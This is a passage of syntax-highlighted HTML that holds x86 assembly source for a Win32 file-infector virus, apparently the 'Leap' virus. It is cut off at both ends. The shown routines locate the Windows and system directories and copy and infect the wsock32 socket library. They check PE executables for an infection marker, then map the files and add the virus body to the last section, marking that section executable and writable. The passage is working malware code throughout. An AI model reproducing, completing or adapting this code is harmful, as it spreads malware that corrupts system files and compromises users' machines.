    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; save it here</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetWindowsDirectory</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; get windowsdir</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GET_WINDIR</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GET_SYSDIR</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">GetSystemDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">128h</span><span class="sc0">                   </span><span class="sc1">; size of dirstring     </span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sysdir</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; save it here</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetSystemDirectory</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get system dir</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GET_SYSDIR</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SET_WINDIR</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">SetWindowsDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; change to sysdir</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">   
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SET_WINDIR</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SET_SYSDIR</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">SetSystemDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sysdir</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; change to sysdir</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">   
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SET_SYSDIR</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;=========================[ ic-infect_wsock.inc ]===========================;</span><span class="sc0">

</span><span class="sc5">INFECT_WSOCK</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">WsockSetSystemDirectory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SET_SYSDIR</span><span class="sc0">
 
    </span><span class="sc5">CopyWSockFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock32inf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock32dll</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACopyFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    
    </span><span class="sc5">SearchWsockFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">infectionflag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; win32 finddata structure</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock32inf</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get wsock32.inf</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AFindFirstFile</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; find the first file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">WsockEndSearch</span><span class="sc0">
        
    </span><span class="sc5">GoInfectWsockInf</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_nFileSizeLow</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ecx = filesize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">; save the filesize</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Leap</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">           </span><span class="sc1">; filesize + virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; + workspace = memory</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">INFECT_FILE</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">infectionflag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DeleteWsockFile</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CREATE_INI_FILE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WsockEndSearch</span><span class="sc0">

    </span><span class="sc5">DeleteWsockFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock32inf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ADeleteFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc5">DeleteIniFile2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SET_WINDIR</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">inifile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ADeleteFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc5">WsockEndSearch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">INFECT_WSOCK</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;=========================[ ic-infect_file.inc ]============================;</span><span class="sc0">

</span><span class="sc5">INFECT_FILE</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

     </span><span class="sc5">SetAttributesToNormal</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_cFileName</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; esi = filename    </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetFileAttributes</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

     </span><span class="sc5">OpenFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; template handle=0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                    </span><span class="sc1">; attributes=any file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                      </span><span class="sc1">; type= existing file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; security option = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">; shared for read</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">         </span><span class="sc1">; generic read write</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">; offset file name</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InfectionError</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-------------------------------[ map file ]---------------------------------;</span><span class="sc0">

    </span><span class="sc5">CreateFileMapping</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; allocates the memory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; filename handle = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; max size = memory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; minumum size = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                      </span><span class="sc1">; read / write access</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; sec. attrbs= default</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACreateFileMapping</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">                 </span><span class="sc1">; eax = new map handle</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">maphandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">                    

    </span><span class="sc5">MapViewOfFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; memory to map</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; file offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; file offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">; file map write mode</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; file map handle</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AMapViewOfFile</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; ok map the file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CloseMap</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; esi= base of map</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; save that base</span><span class="sc0">

    </span><span class="sc5">DoSomeChecks</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">            </span><span class="sc1">; an exe file?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">   
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ll'</span><span class="sc0">          </span><span class="sc1">; already infected?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">OkGo</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">infectionflag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; set infectionflag</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">   

    </span><span class="sc5">OkGo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">          
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">           </span><span class="sc1">; is it a PE file ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">
        
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; save ra PE header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagebase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; save imagebase</span><span class="sc0">
    
</span><span class="sc1">;------------------------------[ append section ]----------------------------;</span><span class="sc0">

    </span><span class="sc5">LocateBeginOfLastSection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20d</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; optional header size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0">                    </span><span class="sc1">; file header size</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; no of sections</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; (we want the last-1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">                    </span><span class="sc1">; sectionheader)</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; * header size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">; esi = begin of last </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; section's header</span><span class="sc0">

    </span><span class="sc5">ChangeLastSectionHeader</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000020h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> 

    </span><span class="sc5">NewAlignedPhysicalSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; old phys size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; save it</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Leap</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; and align it to</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; the sectionalign</span><span class="sc0">
